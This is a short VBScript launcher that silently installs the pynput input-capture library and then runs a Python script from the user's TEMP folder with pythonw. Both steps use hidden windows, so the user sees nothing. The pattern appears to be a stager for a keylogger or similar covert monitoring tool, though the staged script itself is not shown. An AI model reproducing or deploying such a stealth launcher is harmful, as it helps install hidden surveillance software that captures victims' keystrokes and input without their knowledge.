Set objShell = CreateObject("WScript.Shell")

' Install pynput in the background
objShell.Run "cmd /c ""pip install pynput""", 0, True

' Define the path to the Python script in the %TEMP% directory
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
pythonScript = tempPath & "\a.py"

' Run the Python script with pythonw
objShell.Run "cmd /c ""pythonw """ & pythonScript & """", 0, False
